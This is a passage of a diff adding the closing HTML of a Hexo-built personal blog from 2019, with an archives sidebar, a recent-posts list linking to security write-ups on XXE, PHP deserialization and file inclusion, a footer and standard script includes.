+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/05/29/pwn学习01/">01,pwn学习系列</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/13/xxe总结/">xxe总结</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/09/PHP变量覆盖漏洞总结/">PHP变量覆盖总结</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/21/php反序列化漏洞/">php反序列化漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/文件包含漏洞总结/">文件包含漏洞总结</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 杜文涛<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
